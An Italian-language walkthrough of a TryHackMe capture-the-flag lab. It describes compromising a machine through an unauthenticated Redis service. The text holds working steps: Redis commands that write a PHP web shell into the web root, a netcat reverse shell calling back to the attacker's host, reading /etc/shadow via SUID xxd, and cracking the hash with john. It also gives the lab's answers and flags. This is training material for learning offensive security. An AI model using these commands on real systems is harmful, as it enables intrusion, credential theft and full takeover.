
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/res

```
nmap -Pn -O -v -p- 10.10.72.78
```

```
PORT     STATE SERVICE
80/tcp   open  http
6379/tcp open  redis
```
Esegui la scansione della macchina: quante porte sono aperte?
```
2
```

Quale sistema di gestione del database è installato sul server?  

```
redis
```

Su quale porta è in esecuzione il sistema di gestione del database?  

```
6379
```

Qual è la versione del sistema di gestione installato sul server?  
```
nmap -sCV -O -v -p80,6379 10.10.72.78
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7

```

```
6.0.7
```

Compromettere la macchina e individuare user.txt

Diamo un'occhiata al servizio tramite
```
redis-cli -h MACHINE_IP
```

```
apt install redis-tools
```

```
redis-cli -h 10.10.72.78
```

Una volta connesso a un server Redis utilizzando `redis-cli -h 10.10.72.78`, puoi inviare vari comandi per interagire con il database Redis. Ecco alcuni dei comandi più comuni che puoi utilizzare:

1. **Comandi di base:**
    
    - `PING`: Verifica se il server Redis è attivo.
    - `INFO`: Mostra informazioni sul server Redis.
    - `SELECT <db>`: Seleziona un database specifico (Redis supporta più database).
2. **Comandi per le stringhe:**
    
    - `SET <key> <value>`: Imposta il valore di una chiave.
    - `GET <key>`: Recupera il valore di una chiave.
    - `DEL <key>`: Elimina una chiave.
3. **Comandi per le liste:**
    
    - `LPUSH <key> <value>`: Aggiunge un valore all'inizio di una lista.
    - `RPUSH <key> <value>`: Aggiunge un valore alla fine di una lista.
    - `LRANGE <key> <start> <stop>`: Recupera un intervallo di elementi da una lista.
4. **Comandi per gli insiemi:**
    
    - `SADD <key> <member>`: Aggiunge un membro a un insieme.
    - `SMEMBERS <key>`: Recupera tutti i membri di un insieme.
5. **Comandi per gli hash:**
    
    - `HSET <key> <field> <value>`: Imposta il valore di un campo in un hash.
    - `HGET <key> <field>`: Recupera il valore di un campo in un hash.
6. **Comandi per le chiavi:**
    
    - `KEYS <pattern>`: Recupera tutte le chiavi che corrispondono a un pattern.
    - `EXISTS <key>`: Verifica se una chiave esiste.
7. **Comandi di gestione:**
    
    - `FLUSHDB`: Elimina tutte le chiavi del database selezionato.
    - `FLUSHALL`: Elimina tutte le chiavi di tutti i database.

Questi sono solo alcuni dei comandi disponibili in Redis. Puoi consultare la [documentazione ufficiale di Redis](https://redis.io/commands) per un elenco completo e dettagliato di tutti i comandi e delle loro opzioni.

Dal banner sappiamo che si tratta del server **ngnix** che memorizza i suoi dati HTML su **/var/www/html**

**Prepariamo  RCE**

```
config set dir /var/www/html
```
```
config set dbfilename shell.php
```
```
set test "<?php system($_GET['cmd']) ?>"
```
```
save
```

ora verifichiamo RCE
```
http://10.10.72.78/shell.php?cmd=id
```
```
REDIS0009\ufffd redis-ver6.0.7\ufffd redis-bits\ufffd@\ufffdctime\ufffdn\ufffd)h\ufffdused-mem\ufffd`\ufffd\ufffdaof-preamble\ufffd\ufffd\ufffdtestuid=33(www-data) gid=33(www-data) groups=33(www-data) \ufffd\ufffdH\ufffd\ufffd\ufffd<\ufffd
```

```
http://10.10.72.78/shell.php?cmd=whoami
```

```
www-data
```

```
nc -lnvp 1234
```

```
python3 -m http.server 1234
```

```
http://10.10.72.78/shell.php?cmd=nc 10.10.187.250 1234 -e /bin/bash
```

url codificata
```
http://10.10.72.78/shell.php?cmd=nc%2010.10.187.250%201234%20-e%20/bin/bash
```
riceviamo la shell
```
cd /home
ls
vianka
cd vianka
ls
redis-stable
user.txt
cat user.txt
thm{red1s_rce_w1thout_credent1als}
```
Compromettere la macchina e individuare user.txt
```
thm{red1s_rce_w1thout_credent1als}
```

Qual è la password dell'account utente locale?
id

```
find / -perm -u=s -type f 2>/dev/null
```
```
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd

```

https://gtfobins.github.io/
cerchiamo /usr/bin/xxd

Se il binario ha il bit SUID impostato, non perde i privilegi elevati e può essere utilizzato impropriamente per accedere al file system, aumentare o mantenere l'accesso privilegiato come backdoor SUID. Se viene utilizzato per eseguire [nome del file system] `sh -p`, omettere l' `-p`argomento su sistemi come Debian (<= Stretch) che consentono alla `sh`shell predefinita di eseguire con privilegi SUID.
Questo esempio crea una copia locale SUID del binario e la esegue per mantenere privilegi elevati. Per interagire con un binario SUID esistente, saltare il primo comando ed eseguire il programma utilizzando il suo percorso originale
esempio:
```
./xxd "$LFILE" | xxd -r
```
**Stabilizziamo prima la shell**
```
python -c 'import pty; pty.spawn("/bin/bash")'

```
facciamo leggere il file shadow
```
/usr/bin/xxd "/etc/shadow" | xxd -r
```

```
/usr/bin/xxd "/etc/shadow" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
www-data@ubuntu:/var/www/html$ 
```

```
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```
Andiamo a decriptare la password con john
```
nano hashpw.txt
```
```
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

```
john -wordlist=/usr/share/wordlists/rockyou.txt hashpw.txt
```

```
john --show hashpw.txt
```
trovata password!
```
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (vianka)
1g 0:00:00:02 DONE (2025-05-18 17:21) 0.3787g/s 484.8p/s 484.8c/s 484.8C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ip-10-10-187-250:~# john --show hashpw.txt
vianka:beautiful1:18507:0:99999:7:::

```
Qual è la password dell'account utente locale?
```
beautiful1
```

Aumenta i privilegi e ottieni root.txt

```
su vianka
```
e ci logghiamo
```
id
```
```
uid=1000(vianka) gid=1000(vianka) groups=1000(vianka),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

```

```
su -l
```

```
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL

```

```
sudo su
```

```
vianka@ubuntu:/var/www/html$ sudo su
sudo su
root@ubuntu:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/var/www/html# whoami
whoami
root
root@ubuntu:/var/www/html# ls /root
ls /root
root.txt
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
thm{xxd_pr1v_escalat1on}
root@ubuntu:/var/www/html# 

```
Aumenta i privilegi e ottieni root.txt
```
thm{xxxxxxxxxxxxxxxxx}
```

